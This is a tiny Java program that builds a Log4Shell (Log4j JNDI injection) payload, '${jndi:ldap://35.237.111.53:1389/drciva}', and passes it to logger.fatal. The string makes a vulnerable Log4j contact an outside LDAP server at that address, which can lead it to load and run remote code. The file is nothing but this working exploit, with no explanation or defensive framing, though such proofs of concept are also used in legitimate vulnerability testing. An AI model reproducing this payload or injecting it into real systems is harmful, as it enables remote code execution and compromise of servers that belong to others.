import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j {
  private static final Logger logger = LogManager.getLogger(log4j.class);
  
  public static void main(String[] args) {
    String var = "${jndi:ldap://35.237.111.53:1389/drciva}";
    logger.fatal("Message: " + var);
  }
}
